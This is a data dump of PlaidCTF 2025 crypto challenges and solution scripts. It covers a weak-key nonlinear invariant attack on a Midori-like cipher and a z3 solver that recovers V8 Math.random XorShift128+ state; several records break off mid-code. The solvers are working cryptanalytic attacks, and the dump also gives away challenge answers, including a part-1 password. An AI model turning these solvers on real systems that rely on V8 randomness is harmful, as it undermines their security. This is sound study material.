0x09,\n    0xC7, 0xF6, 0x37, 0xDF, 0xD0, 0x34, 0x62, 0x0D, 0xE5, 0x0B, 0xC0, 0xC4, 0xE6, 0x3C, 0x26, 0xA6,\n    0xB2, 0x45, 0x57, 0x07, 0xE9, 0xD2, 0xAE, 0xA3, 0x36, 0xB9, 0x17, 0x81, 0x5E, 0xB4, 0x18, 0x12,\n    0xFA, 0x4F, 0x6D, 0x47, 0xD7, 0xD5, 0x1B, 0x90, 0x8E, 0xDB, 0x13, 0xED, 0x3F, 0x84, 0x43, 0x87,\n    0x73, 0x22, 0xA9, 0x00, 0x69, 0x6F, 0x8D, 0x1D, 0xF2, 0xB1, 0xBA, 0x4C, 0x8C, 0x4E, 0x1C, 0x54,\n    0x6B, 0x58, 0xF8, 0xF7, 0xAD, 0x23, 0xE3, 0xBC, 0x16, 0x44, 0x97, 0xF1, 0x93, 0x9A, 0x83, 0xCF,\n]\nmix1 = [\n    0xC2, 0x53, 0x18, 0x89, 0x5E, 0xCF, 0x84, 0x15, 0x76, 0xE7, 0xAC, 0x3D, 0xEA, 0x7B, 0x30, 0xA1,\n    0x13, 0x82, 0xC9, 0x58, 0x8F, 0x1E, 0x55, 0xC4, 0xA7, 0x36, 0x7D, 0xEC, 0x3B, 0xAA, 0xE1, 0x70,\n    0xFF, 0x6E, 0x25, 0xB4, 0x63, 0xF2, 0xB9, 0x28, 0x4B, 0xDA, 0x91, 0x00, 0xD7, 0x46, 0x0D, 0x9C,\n    0x2E, 0xBF, 0xF4, 0x65, 0xB2, 0x23, 0x68, 0xF9, 0x9A, 0x0B, 0x40, 0xD1, 0x06, 0x97, 0xDC, 0x4D,\n    0xBC, 0x2D, 0x66, 0xF7, 0x20, 0xB1, 0xFA, 0x6B, 0x08, 0x99, 0xD2, 0x43, 0x94, 0x05, 0x4E, 0xDF,\n    0x6D, 0xFC, 0xB7, 0x26, 0xF1, 0x60, 0x2B, 0xBA, 0xD9, 0x48, 0x03, 0x92, 0x45, 0xD4, 0x9F, 0x0E,\n    0x81, 0x10, 0x5B, 0xCA, 0x1D, 0x8C, 0xC7, 0x56, 0x35, 0xA4, 0xEF, 0x7E, 0xA9, 0x38, 0x73, 0xE2,\n    0x50, 0xC1, 0x8A, 0x1B, 0xCC, 0x5D, 0x16, 0x87, 0xE4, 0x75, 0x3E, 0xAF, 0x78, 0xE9, 0xA2, 0x33,\n    0x04, 0x95, 0xDE, 0x4F, 0x98, 0x09, 0x42, 0xD3, 0xB0, 0x21, 0x6A, 0xFB, 0x2C, 0xBD, 0xF6, 0x67,\n    0xD5, 0x44, 0x0F, 0x9E, 0x49, 0xD8, 0x93, 0x02, 0x61, 0xF0, 0xBB, 0x2A, 0xFD, 0x6C, 0x27, 0xB6,\n    0x39, 0xA8, 0xE3, 0x72, 0xA5, 0x34, 0x7F, 0xEE, 0x8D, 0x1C, 0x57, 0xC6, 0x11, 0x80, 0xCB, 0x5A,\n    0xE8, 0x79, 0x32, 0xA3, 0x74, 0xE5, 0xAE, 0x3F, 0x5C, 0xCD, 0x86, 0x17, 0xC0, 0x51, 0x1A, 0x8B,\n    0x7A, 0xEB, 0xA0, 0x31, 0xE6, 0x77, 0x3C, 0xAD, 0xCE, 0x5F, 0x14, 0x85, 0x52, 0xC3, 0x88, 0x19,\n    0xAB, 0x3A, 0x71, 0xE0, 0x37, 0xA6, 0xED, 0x7C, 0x1F, 0x8E, 0xC5, 0x54, 0x83, 0x12, 0x59, 0xC8,\n    0x47, 0xD6, 0x9D, 0x0C, 0xDB, 0x4A, 0x01, 0x90, 0xF3, 0x62, 0x29, 0xB8, 0x6F, 0xFE, 0xB5, 0x24,\n    0x96, 0x07, 0x4C, 0xDD, 0x0A, 0x9B, 0xD0, 0x41, 0x22, 0xB3, 0xF8, 0x69, 0xBE, 0x2F, 0x64, 0xF5,\n]\nmix2 = [\n    0xEE, 0x38, 0x9C, 0x0C, 0x49, 0x76, 0x3C, 0x93, 0x95, 0x19, 0x27, 0xC4, 0x17, 0xA5, 0xBC, 0xF5,\n    0xCF, 0x46, 0xFD, 0x77, 0xFB, 0x51, 0x29, 0x85, 0x5E, 0x66, 0x2B, 0x7B, 0xF1, 0x39, 0x65, 0x60,\n    0xE7, 0xC1, 0x5F, 0xD8, 0x9E, 0xBB, 0xF9, 0xE9, 0x2D, 0x83, 0xA9, 0x53, 0xCD, 0x45, 0x50, 0x04,\n    0x23, 0xD2, 0x37, 0x4A, 0xC0, 0x6E, 0x42, 0xBD, 0xB1, 0x22, 0x52, 0x24, 0xD4, 0x63, 0xC9, 0xDB,\n    0x8A, 0x31, 0x01, 0x1A, 0x70, 0x1C, 0x05, 0x72, 0x8C, 0xD6, 0x0A, 0x3A, 0x33, 0xEF, 0xB5, 0x8D,\n    0xE0, 0x55, 0x78, 0x8E, 0x09, 0xA0, 0x2F, 0x75, 0xB8, 0xD9, 0x88, 0xAA, 0x14, 0x86, 0x69, 0xC5,\n    0xDC, 0x4B, 0xEB, 0x07, 0x84, 0xAC, 0x54, 0x26, 0xEC, 0x28, 0x90, 0x56, 0x03, 0x9D, 0xD7, 0xF0,\n    0x97, 0x0B, 0xB3, 0xD3, 0x80, 0x81, 0xB0, 0xC6, 0x59, 0x4E, 0x91, 0xBE, 0x36, 0xB9, 0xFC, 0xB7,\n    0x10, 0x2E, 0x3D, 0x87, 0xE5, 0x6D, 0x96, 0x16, 0x00, 0x02, 0x99, 0x73, 0x06, 0xDA, 0x4F, 0x32,\n    0x4C, 0xC3, 0x3B, 0x2A, 0x94, 0x48, 0x25, 0x62, 0x2C, 0x8B, 0x98, 0xB2, 0xE6, 0xE2, 0x5A, 0x71,\n    0xB6, 0xEA, 0x08, 0x0D, 0xA7, 0x89, 0x7A, 0xF7, 0xDF, 0x1E, 0xE3, 0x43, 0x7C, 0x3F, 0x35, 0x1D,\n    0xCC, 0xAE, 0x1B, 0x82, 0xE8, 0x6F, 0xD0, 0xC8, 0xB4, 0x92, 0x3E, 0x34, 0xED, 0xD1, 0x67, 0x0E,\n    0xC7, 0x30, 0x41, 0xF4, 0xDD, 0x5C, 0x4D, 0x20, 0x58, 0x12, 0xF8, 0x15, 0xA1, 0x61, 0xD5, 0xF3,\n    0xC2, 0xA4, 0x79, 0x40, 0x21, 0xE4, 0x6B, 0xAB, 0xA3, 0xA6, 0x6A, 0xF2, 0x7E, 0x47, 0x7F, 0x5B,\n    0x74, 0x9F, 0x7D, 0x68, 0x18, 0xBF, 0x8F, 0xAD, 0x13, 0xCB, 0xBA, 0xA8, 0x6C, 0x64, 0xA2, 0xCA,\n    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,\n    # ?\n]\nmix3 = [\n    0x7D, 0x32, 0x09, 0x23, 0x56,", "name": "hash_collide"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\mellons\\chall.py", "category": "crypto", "solution_code": "from random import randint\n\nbeta=[[0,0,0,1,0,1,0,1,1,0,1,1,0,0,1,1],[0,1,1,1,1,0,0,0,1,1,0,0,0,0,0,0],[1,0,1,0,0,1,0,0,0,0,1,1,0,1,0,1],[0,1,1,0,0,0,1,0,0,0,0,1,0,0,1,1],[0,0,0,1,0,0,0,0,0,1,0,0,1,1,1,1],[1,1,0,1,0,0,0,1,0,1,1,1,0,0,0,0],[0,0,0,0,0,0,1,0,0,1,1,0,0,1,1,0],[0,0,0,0,1,0,1,1,1,1,0,0,1,1,0,0],[1,0,0,1,0,1,0,0,1,0,0,0,0,0,0,1],[0,1,0,0,0,0,0,0,1,0,1,1,1,0,0,0],[0,1,1,1,0,0,0,1,1,0,0,1,0,1,1,1],[0,0,1,0,0,0,1,0,1,0,0,0,1,1,1,0],[0,1,0,1,0,0,0,1,0,0,1,1,0,0,0,0],[1,1,1,1,1,0,0,0,1,1,0,0,1,0,1,0],[1,1,0,1,1,1,1,1,1,0,0,1,0,0,0,0]]\nS = [0xc,0xa,0xd,0x3,0xe,0xb,0xf,0x7,0x8,0x9,0x1,0x5,0x0,0x2,0x4,0x6]\nP = [0,10,5,15,14,4,11,1,9,3,12,6,7,13,2,8]\ndef encrypt_block(plainText, WK, K0, K1):\n  state = [a ^ b for a, b in zip(WK, plainText)]\n  sched = [K0, K1, K0, K1, K0, K1, K0, K1, K0, K1, K0, K1, K0, K1, K0]\n  for i in range(15):\n    for j in range(16):\n      state[j] = S[state[j]]\n\n    tmp = state[:]\n    for j in range(16):\n      tmp[j] = state[P[j]]\n    state = tmp\n\n    tmp = state[:]\n    for j in range(0, 16, 4):\n      state[j] = tmp[j+1] ^ tmp[j+2] ^ tmp[j+3]\n      state[j+1] = tmp[j] ^ tmp[j+2] ^ tmp[j+3]\n      state[j+2] = tmp[j] ^ tmp[j+1] ^ tmp[j+3]\n      state[j+3] = tmp[j] ^ tmp[j+1] ^ tmp[j+2]\n\n    state = [a^b for a, b in zip(state, [x ^ y for (x, y) in zip(beta[i], sched[i])])]\n\n  for j in range(16):\n    state[j] = S[state[j]]\n\n  return [a ^ b for a, b in zip(WK, state)]\n\ndef split_nibbles(l):\n  res = []\n  for i in l:\n    res.append((i >> 4) & 0xf)\n    res.append(i & 0xf)\n  return res\n\ndef unsplit_nibbles(l):\n  res = []\n  for i in range(0, len(l), 2):\n    res.append((l[i] << 4) | l[i+1])\n  return res\n\ndef compress(message_bytes):\n  output = []\n  for b in message_bytes:\n    assert b & 0x80 == 0\n    output.append(format(b, '07b'))\n  output_str = ''.join(output)\n  if len(output_str) % 8 != 0:\n    output_str += '0' * (8 - (len(output_str) % 8))\n  res = []\n  for i in range(0, len(output_str), 8):\n    res.append(int(output_str[i:i+8], 2))\n  return res\n\ndef decompress(message_bytes):\n  bits = []\n  for b in message_bytes:\n    bits.append(format(b, '08b'))\n  bitstr = ''.join(bits)\n  bitstr = bitstr[:-(len(bitstr) % 7)]\n  output = []\n  for i in range(0, len(bitstr), 7):\n    output.append(int(bitstr[i:i+7], 2))\n  return output\n\ndef encrypt(key, message):\n  key = split_nibbles(key)\n  K0 = key[:16]\n  K1 = key[16:32]\n  WK = [a ^ b for a,b in zip(K0, K1)]\n  padding_needed = 8 - (len(message) % 8)\n  message = split_nibbles(list(message) + padding_needed * [padding_needed])\n  assert len(message) % 16 == 0\n  assert len(message) > 0\n  blocks = [message[i:i+16] for i in range(0, len(message), 16)]\n  iv = split_nibbles([randint(0,255) for _ in range(8)])\n  output = list(iv)\n  for block in blocks:\n    pt = [a ^ b for (a,b) in zip(block, iv)]\n    ct = encrypt_block(pt, WK, K0, K1)\n    assert len(ct) == 16\n    output.extend(ct)\n    iv = ct\n  assert all(c < 0x10 for c in output)\n  return unsplit_nibbles(output)\n\nif __name__ == '__main__':\n  with open('key.bin', 'rb') as f:\n    key = f.read()\n    assert len(key) == 16\n    assert 32 < sum(k.bit_count() for k in key) <= 64\n  with open('flag.txt', 'rb') as f:\n    flag = f.read().strip()\n    assert len(flag) == 41, len(flag)\n\n  message = compress(b'PPPMSG:PPPMSG:' + (b'PCTF{' + flag + b'}') * 3000)\n  ciphertext = bytes(encrypt(key, message))\n  with open('ct0.bin', 'wb') as f:\n    f.write(ciphertext)\n\n  verification = compress(b'P' * 7000)\n  with open('ct1.bin', 'wb') as f:\n    f.write(bytes(encrypt(key, verification)))\n\n", "name": "chall"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\mellons\\nonlinear_isa.py", "category": "crypto", "solution_code": "\"\"\" \nImplementation of https://eprint.iacr.org/2016/732.pdf\n- Weak Distinguish Attack\n- Known-Ciphertext Attack of CBC Mode\n\"\"\"\n\nfrom sage.all import BooleanPolynomialRing, Sequence\n\n\ndef compress(message_bytes: bytes) -> list[int]:\n    \"\"\" \n    Compresses a ascii byte array (removes the MSB of each byte) into a list of nibbles.\n    Each byte is represented by 7 bits, and the result is padded to a multiple of 8 bits.\n    \"\"\"\n    output = []\n    for b in message_bytes:\n        assert b & 0x80 == 0\n        output.append(format(b, '07b'))\n    output_str = ''.join(output)\n    if len(output_str) % 8 != 0:\n        output_str += '0' * (8 - (len(output_str) % 8))\n    res = []\n    for i in range(0, len(output_str), 8):\n        res.append(int(output_str[i:i+8], 2))\n    return res\n\ndef compress_to_bits_without_pad(message_bytes: bytes) -> list[int]:\n    \"\"\" \n    Compresses a ascii byte array (removes the MSB of each byte) into a list of nibbles.\n    \"\"\"\n    output = []\n    for b in message_bytes:\n        assert b & 0x80 == 0\n        output.append(format(b, '07b'))\n    output_str = ''.join(output)\n    return [int(i) for i in output_str]\n\ndef decompress(message_bytes):\n    \"\"\"\n    Decompresses a list of bytes into a byte array.\n    Each byte is formed by combining 7 bits from the input (the remaining zeros are ignored).\n    \"\"\"\n    bits = []\n    for b in message_bytes:\n        bits.append(format(b, '08b'))\n    bitstr = ''.join(bits)\n    bitstr = bitstr[:-(len(bitstr) % 7)]\n    output = []\n    for i in range(0, len(bitstr), 7):\n        output.append(int(bitstr[i:i+7], 2))\n    return output\n\ndef xor(a, b):\n    \"\"\"\n    XORs two byte arrays of the same length.\n    \"\"\"\n    assert len(a) == len(b)\n    return bytes([a[i] ^ b[i] for i in range(len(a))])\n\ndef sym_xor(a, b):\n    assert len(a) == len(b)\n    return [a[i] + b[i] for i in range(len(a))]\n\ndef split_unlinean_invariants(vec: list):\n    assert len(vec) == 64\n    linear_part = [0] * 64\n    nonlinear_part = [0] * 64\n    for i in range(0, 64, 4):\n        linear_part[i] = vec[i]\n        linear_part[i + 1] = vec[i + 1]\n        nonlinear_part[i + 2] = vec[i + 2]\n        nonlinear_part[i + 3] = vec[i + 3]\n    return linear_part, nonlinear_part\n\nbool_poly_ring = BooleanPolynomialRing(4, 'x')\nx0, x1, x2, x3 = bool_poly_ring.gens()\nS = [0xc, 0xa, 0xd, 0x3, 0xe, 0xb, 0xf, 0x7,\n     0x8, 0x9, 0x1, 0x5, 0x0, 0x2, 0x4, 0x6]\n\nsbox_nonlinear_invariants = [\n    x0 * x3 + x0 + x2 * x3 + x3,\n    x0 * x3 + x1 + x2 + x3,\n    x0 * x1 + x1 * x2 + x2 * x3 + x2,\n    x0 * x2 + x0 * x3]\n\ndef check_nonlinear_invariants():\n    for invariant_poly in sbox_nonlinear_invariants:\n        consts = []\n        for inp, out in enumerate(S):\n            inp_bits = [int(b) for b in bin(inp)[2:].zfill(4)][::-1]\n            out_bits = [int(b) for b in bin(out)[2:].zfill(4)][::-1]\n            invariant_poly_value = invariant_poly(*inp_bits) + invariant_poly(*out_bits)\n            consts.append(invariant_poly_value)\n        assert len(set(consts)) == 1, f\"Invariant polynomial {consts = } is not invariant for all inputs.\"\n        print(f\"Invariant polynomial {invariant_poly} is invariant with const = {consts[0]}.\")  \n\n# we choose g = g[0] + g[1] = x0 + x1 + x2 + x2 * x3 as the nonlinear invariant\n# g = sbox_nonlinear_invariants[0] + sbox_nonlinear_invariants[1]\ng = x0 + x1 + x2 + x2 * x3\n# linear part of nonlinear_invariant g \nl = x0 + x1 + x2\n\n# extend top 64 bits\nbool_poly_ring_64 = BooleanPolynomialRing(64, 'x')\nxs = bool_poly_ring_64.gens()\n# the nonlinear invariant polynomial for Midori64 with the weak key\nG = sum(xs[i] + xs[i+1] + xs[i + 2] + xs[i+2] * xs[i + 3] for i in range(0, 64, 4))\nL = sum(xs[i] + xs[i+1] + xs[i+2] for i in range(0, 64, 4))\nF = sum(xs[i+2] * xs[i + 3] for i in range(0, 64, 4))\n# the invariant const: c = L(K1) âŠ• L(Î±0) âŠ• L(Î±1) âŠ• Â· Â· Â· âŠ• L(Î±14).\n# -> c = L(K1)\n\nwith open(\"./ct1.bin\", \"rb\") as f:\n    data = f.read()\n    data = bytearray(data)\n\n# we check that the weak key is used in this challenge by known plaintext-ciphertext pairs\niv = data[0:8]\ndata = data[8:]\nverification = compress(b'P' * 7000)\npadding_needed = 8 - (len(verification) % 8)\nmessage = list(verification) + padding_needed * [padding_needed]\nassert len(message)  == len(data)\nivs = iv + data[:-8]\nassert len(ivs) == len(message)\npt_blocks = [xor(ivs[i:i+8], message[i:i+8]) for i in range(0, len(data), 8)]\nct_blocks = [data[i:i+8] for i in range(0, len(data), 8)]\nconsts = []\nfor pt_block,ct_block in zip(pt_blocks, ct_blocks):\n    inp_bits64 = [int(b) for b in bin(int.from_bytes(pt_block, 'big'))[2:].zfill(64)][::-1]\n    out_bits64 = [int(b) for b in bin(int.from_bytes(ct_block, 'big'))[2:].zfill(64)][::-1]\n    invariant_poly_value = G(*inp_bits64) + G(*out_bits64)\n    consts.append(invariant_poly_value)\nassert len(set(consts)) == 1, f\"Invariant polynomial {consts = } is not invariant for all inputs.\"\nprint(f\"Weak key is used in this challenge with L(K1) = {consts[0]}.\")\n\n\nwith open(\"./ct0.bin\", \"rb\") as f:\n    dat", "name": "nonlinear_isa"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\mellons\\test_challenge.py", "category": "crypto", "solution_code": "from random import randint\n\nbeta = [\n    [0, 0, 0, 1, 0, 1, 0, 1, 1, 0, 1, 1, 0, 0, 1, 1],\n    [0, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 0, 0, 0, 0],\n    [1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 1, 1, 0, 1, 0, 1],\n    [0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 1, 0, 0, 1, 1],\n    [0, 0, 0, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 1, 1],\n    [1, 1, 0, 1, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0],\n    [0, 0, 0, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 1, 1, 0],\n    [0, 0, 0, 0, 1, 0, 1, 1, 1, 1, 0, 0, 1, 1, 0, 0],\n    [1, 0, 0, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 1],\n    [0, 1, 0, 0, 0, 0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0],\n    [0, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 1, 1],\n    [0, 0, 1, 0, 0, 0, 1, 0, 1, 0, 0, 0, 1, 1, 1, 0],\n    [0, 1, 0, 1, 0, 0, 0, 1, 0, 0, 1, 1, 0, 0, 0, 0],\n    [1, 1, 1, 1, 1, 0, 0, 0, 1, 1, 0, 0, 1, 0, 1, 0],\n    [1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0]\n]\nS = [0xc, 0xa, 0xd, 0x3, 0xe, 0xb, 0xf, 0x7,\n     0x8, 0x9, 0x1, 0x5, 0x0, 0x2, 0x4, 0x6]\n\nP = [0, 10, 5, 15, 14, 4, 11, 1, 9, 3, 12, 6, 7, 13, 2, 8]\n\n\ndef encrypt_block(plainText: list, WK: list, K0: list, K1: list) -> list:\n    \"\"\" Encrypts a block of plaintext using the given key schedule and round keys.\n\n    Args:\n        plainText (list): list of nibbles (4-bit values) representing the plaintext.\n        WK (list): list of 16 nibbles (4-bit values) (XOR of K0 and K1).\n        K0 (list): list of 16 nibbles (4-bit values).\n        K1 (list): list of 16 nibbles (4-bit values).\n\n    Returns:\n        list: list of nibbles (4-bit values) representing the ciphertext.\n    \"\"\"\n    state = [a ^ b for a, b in zip(WK, plainText)]\n    sched = [K0, K1, K0, K1, K0, K1, K0, K1, K0, K1, K0, K1, K0, K1, K0]\n    for i in range(15):\n        for j in range(16):\n            state[j] = S[state[j]]\n\n        tmp = state[:]\n        for j in range(16):\n            tmp[j] = state[P[j]]\n        state = tmp\n\n        tmp = state[:]\n        for j in range(0, 16, 4):\n            state[j] = tmp[j+1] ^ tmp[j+2] ^ tmp[j+3]\n            state[j+1] = tmp[j] ^ tmp[j+2] ^ tmp[j+3]\n            state[j+2] = tmp[j] ^ tmp[j+1] ^ tmp[j+3]\n            state[j+3] = tmp[j] ^ tmp[j+1] ^ tmp[j+2]\n\n        state = [a ^ b for a, b in zip(state, [x ^ y for (x, y) in zip(beta[i], sched[i])])]\n\n    for j in range(16):\n        state[j] = S[state[j]]\n\n    return [a ^ b for a, b in zip(WK, state)]\n\n\ndef split_nibbles(l: bytes) -> list[int]:\n    \"\"\"\n    Splits a list of bytes into nibbles (4-bit values).\n    Returns a list of nibbles (0-15)    \n    \"\"\"\n    res = []\n    for i in l:\n        res.append((i >> 4) & 0xf)\n        res.append(i & 0xf)\n    return res\n\n\ndef unsplit_nibbles(l: list[int]) -> bytes:\n    \"\"\" \n    Combines a list of nibbles (4-bit values) into bytes.\n    Each byte is formed by combining two nibbles.\n    Args:\n        l (list[int]): List of nibbles (0-15).\n\n    Returns:\n        bytes: Combined bytes/list of integers.\n    \"\"\"\n    res = []\n    for i in range(0, len(l), 2):\n        res.append((l[i] << 4) | l[i+1])\n    return res\n\n\ndef compress(message_bytes: bytes) -> list[int]:\n    \"\"\" \n    Compresses a ascii byte array (removes the MSB of each byte) into a list of nibbles.\n    Each byte is represented by 7 bits, and the result is padded to a multiple of 8 bits.\n    \"\"\"\n    output = []\n    for b in message_bytes:\n        assert b & 0x80 == 0\n        output.append(format(b, '07b'))\n    output_str = ''.join(output)\n    if len(output_str) % 8 != 0:\n        output_str += '0' * (8 - (len(output_str) % 8))\n    res = []\n    for i in range(0, len(output_str), 8):\n        res.append(int(output_str[i:i+8], 2))\n    return res\n\n\ndef decompress(message_bytes):\n    \"\"\"\n    Decompresses a list of bytes into a byte array.\n    Each byte is formed by combining 7 bits from the input (the remaining zeros are ignored).\n    \"\"\"\n    bits = []\n    for b in message_bytes:\n        bits.append(format(b, '08b'))\n    bitstr = ''.join(bits)\n    bitstr = bitstr[:-(len(bitstr) % 7)]\n    output = []\n    for i in range(0, len(bitstr), 7):\n        output.append(int(bitstr[i:i+7], 2))\n    return output\n\n\ndef encrypt(key: bytes, message: bytes) -> bytes:\n    \"\"\"Encrypts a message using a key and a block cipher.\n\n    Args:\n        key (bytes): key of 16 bytes (128 bits) to be used for encryption.\n        message (bytes): message to be encrypted.\n    Returns:\n        bytes: encrypted message.\n    \"\"\"\n    key = split_nibbles(key) # convert key to nibbles, 32 nibbles (4 bits each)\n    K0 = key[:16]   # first 16 nibbles (64 bits) of the key\n    K1 = key[16:32] # second 16 nibbles (64 bits) of the key\n    WK = [a ^ b for a, b in zip(K0, K1)] # XOR of K0 and K1\n    padding_needed = 8 - (len(message) % 8)\n    message = split_nibbles(list(message) + padding_needed * [padding_needed])\n    assert len(message) % 16 == 0\n    assert len(message) > 0\n    # 16 nibbles per block (64 bits)\n    # split message into blocks of 16 nibbles (64 bits)\n    blocks = [message[i:i+16] for i in range(0, len(message), 16)]\n    iv = split_nibbles([randint(0, 255) for _ in range(8)])", "name": "test_challenge"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\innov8\\level1\\chall1.py", "category": "crypto", "solution_code": "import subprocess\n\nsecret = open('secret.txt').read().strip()\nsecretbits = ''.join(f'{ord(i):08b}' for i in secret)\n\noutput = []\n\nfor bit in secretbits:\n    if bit == '0':\n        output += [float(i) for i in subprocess.check_output('./d8 gen.js', shell=True).decode().split()]\n    else:\n        output += [float(i) for i in subprocess.check_output('node gen.js', shell=True).decode().split()]\n\nfor i in output:\n    print(i)\n", "name": "chall1"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\innov8\\level1\\exp.py", "category": "crypto", "solution_code": "#!/usr/bin/python3\nimport z3\nimport struct\nimport sys\nfrom tqdm import trange\n\n\n\"\"\" \nFrom https://github.com/PwnFunction/v8-randomness-predictor\n\nSolving for seed states in XorShift128+ used in V8\n> https://v8.dev/blog/math-random\n> https://apechkurov.medium.com/v8-deep-dives-random-thoughts-on-math-random-fb155075e9e5\n> https://blog.securityevaluators.com/hacking-the-javascript-lottery-80cc437e3b7f\n\n> Tested on Chrome(102.0.5005.61) or Nodejs(v18.2.0.) \n\"\"\"\n\n\"\"\"\nPlug in a handful random number sequences from node/chrome\n> Array.from(Array(5), Math.random)\n\n(Optional) In node, we can specify the seed\n> node --random_seed=1337\n\"\"\"\nwith open(\"./output.txt\", \"r\") as f:\n    lines = f.readlines()\n    sequence = []\n    for line in lines:\n        if line.strip() == \"\":\n            continue\n        sequence.append(float(line.strip()))\n\n# modfiied from https://github.com/PwnFunction/v8-randomness-predictor\ndef is_node_rng(nums, length = 16):\n    \"\"\"\n    Random numbers generated from xorshift128+ is used to fill an internal entropy pool of size 64\n    > https://github.com/v8/v8/blob/7a4a6cc6a85650ee91344d0dbd2c53a8fa8dce04/src/numbers/math-random.cc#L35\n\n    Numbers are popped out in LIFO(Last-In First-Out) manner, hence the numbers presented from the entropy pool are reveresed.\n    \"\"\"\n    assert len(nums) > length + 1\n    sequence = nums[:length][::-1]\n    check_num = nums[length]\n\n    solver = z3.Solver()\n\n    \"\"\"\n    Create 64 bit states, BitVec (uint64_t)\n    > static inline void XorShift128(uint64_t* state0, uint64_t* state1);\n    > https://github.com/v8/v8/blob/a9f802859bc31e57037b7c293ce8008542ca03d8/src/base/utils/random-number-generator.h#L119\n    \"\"\"\n    se_state0, se_state1 = z3.BitVecs(\"se_state0 se_state1\", 64)\n\n    for i in range(len(sequence)):\n        \"\"\"\n        XorShift128+\n        > https://vigna.di.unimi.it/ftp/papers/xorshiftplus.pdf\n        > https://github.com/v8/v8/blob/a9f802859bc31e57037b7c293ce8008542ca03d8/src/base/utils/random-number-generator.h#L119\n\n        class V8_BASE_EXPORT RandomNumberGenerator final {\n            ...\n            static inline void XorShift128(uint64_t* state0, uint64_t* state1) {\n                uint64_t s1 = *state0;\n                uint64_t s0 = *state1;\n                *state0 = s0;\n                s1 ^= s1 << 23;\n                s1 ^= s1 >> 17;\n                s1 ^= s0;\n                s1 ^= s0 >> 26;\n                *state1 = s1;\n            }\n            ...\n        }\n        \"\"\"\n        se_s1 = se_state0\n        se_s0 = se_state1\n        se_state0 = se_s0\n        se_s1 ^= se_s1 << 23\n        se_s1 ^= z3.LShR(se_s1, 17)  # Logical shift instead of Arthmetric shift\n        se_s1 ^= se_s0\n        se_s1 ^= z3.LShR(se_s0, 26)\n        se_state1 = se_s1\n\n        \"\"\"\n        IEEE 754 double-precision binary floating-point format\n        > https://en.wikipedia.org/wiki/Double-precision_floating-point_format\n        > https://www.youtube.com/watch?v=p8u_k2LIZyo&t=257s\n\n        Sign (1)    Exponent (11)    Mantissa (52)\n        [#]         [###########]    [####################################################]\n        \"\"\"\n\n        \"\"\"\n        Pack as `double` and re-interpret as unsigned `long long` (little endian)\n        > https://stackoverflow.com/a/65377273\n        \"\"\"\n        float_64 = struct.pack(\"d\", sequence[i] + 1)\n        u_long_long_64 = struct.unpack(\"<Q\", float_64)[0]\n\n        \"\"\"\n        # visualize sign, exponent & mantissa\n        bits = bin(u_long_long_64)[2:]\n        bits = '0' * (64-len(bits)) + bits\n        print(f'{bits[0]} {bits[1:12]} {bits[12:]}')\n        \"\"\"\n\n        # Get the lower 52 bits (mantissa)\n        mantissa = u_long_long_64 & ((1 << 52) - 1)\n\n        # Compare Mantissas\n        solver.add(int(mantissa) == z3.LShR(se_state0, 12))\n\n\n    if solver.check() == z3.sat:\n        model = solver.model()\n\n        states = {}\n        for state in model.decls():\n            states[state.__str__()] = model[state]\n\n        # print(states)\n\n        state0 = states[\"se_state0\"].as_long()\n\n        \"\"\"\n        Extract mantissa\n        - Add `1.0` (+ 0x3FF0000000000000) to 52 bits\n        - Get the double and Subtract `1` to obtain the random number between [0, 1)\n\n        > https://github.com/v8/v8/blob/a9f802859bc31e57037b7c293ce8008542ca03d8/src/base/utils/random-number-generator.h#L111\n\n        static inline double ToDouble(uint64_t state0) {\n            // Exponent for double values for [1.0 .. 2.0)\n            static const uint64_t kExponentBits = uint64_t{0x3FF0000000000000};\n            uint64_t random = (state0 >> 12) | kExponentBits;\n            return base::bit_cast<double>(random) - 1;\n        }\n        \"\"\"\n        u_long_long_64 = (state0 >> 12) | 0x3FF0000000000000\n        float_64 = struct.pack(\"<Q\", u_long_long_64)\n        next_sequence = struct.unpack(\"d\", float_64)[0]\n        next_sequence -= 1\n        return next_sequence == check_num\n    else:\n        return 0\n\n\nres = \"\"\nfor i in trange(0, len(sequence), 24):\n    if is_node_rng(se", "name": "exp"}
{"source": "tl2cents_writeups", "path": "data\\tl2cents_writeups\\2025\\PlaidCTF\\innov8\\level2\\chall2.py", "category": "crypto", "solution_code": "import signal\nimport struct\nimport subprocess\nimport os\nimport sys\nimport tempfile\n\nMASK = 0xFFFFFFFFFFFFFFFF\np64 = lambda x: struct.pack(\"<Q\", x)\n\nsignal.alarm(30)\n\nif input(\"password from part 1: \").strip() != \"oaq1MD92evRsDZvH\":\n    print(\"wrong\")\n    sys.exit(1)\n\ns0 = int(input(\"s0: \")) & MASK\ns1 = int(input(\"s1: \")) & MASK\n\nif s0 == 0 and s1 == 0:\n    print(\"bad\")\n    sys.exit(1)\n\nmaximum = int(input(\"maximum: \"))\n\n\nif not 0 <= maximum <= 4600000000000000:\n    print(\"bad\")\n    sys.exit(1)\n\n# the d8 and node binaries are taken from the part 1 docker image (excav8)\nwith open(\"d8\", \"rb\") as f:\n    d8 = bytearray(f.read())\nwith open(\"node\", \"rb\") as f:\n    node = bytearray(f.read())\n\n# patch MathRandom::RefillCache\nd8[0x917E8E : 0x917E8E + 10] = b\"\\x49\\xbe\" + p64(s0)  # mov r14, s0\nd8[0x917E8E + 10 : 0x917E8E + 20] = b\"\\x48\\xb9\" + p64(s1)  # mov rcx, s1\nd8[0x917E8E + 20 : 